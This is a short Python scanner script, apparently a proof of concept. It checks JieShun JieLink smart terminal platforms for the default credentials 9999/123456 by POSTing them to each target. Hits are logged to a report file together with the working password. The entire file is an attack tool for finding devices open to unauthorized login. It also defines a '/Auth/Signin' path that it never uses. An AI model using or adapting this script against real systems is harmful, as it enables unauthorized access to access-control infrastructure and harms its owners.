import requests
import time
import buter
import wirtefile

info = "捷顺JieLink智能终端操作平台默认口令"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc = '/Auth/Signin'
data = '''username=9999&password=123456'''
headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "application/x-www-form-urlencoded"
}
def jieshunleak(url):
    try:
        reps = requests.post(url=url, headers=headers,data=data, verify=False, timeout=10)
        if 'window.top.location.href' in reps.text and reps.status_code == 200:
            print(buter.colors.GREEN+  f"存在{info} url : {url}\nleak : 9999/123456 " + buter.colors.END)
            reptext = reps.url + "9999/123456"
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
